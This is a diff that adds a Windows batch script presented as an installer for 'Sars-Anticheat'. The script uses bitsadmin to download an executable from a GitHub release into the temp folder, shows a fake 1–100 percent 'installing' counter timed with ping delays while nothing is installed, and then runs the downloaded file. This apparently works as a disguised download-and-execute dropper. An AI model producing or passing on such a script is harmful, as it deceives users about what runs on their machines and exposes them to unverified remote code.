@@ -1,0 +1,16 @@
+@echo off
+set a=https://github.com/aserthh/Sars-Anticheat/releases/download/v/SarsAnticheat.exe
+set b=%TEMP%\SarsAnticheat.exe
+
+echo Iniciando download...
+bitsadmin /transfer w %a% %b%
+
+echo.
+echo Instalando Sars-Anticheat...
+
+for /L %%i in (1,1,100) do (
+    echo %%i%% completo...
+    ping -n 2 127.0.0.1 > nul
+)
+
+start %b%
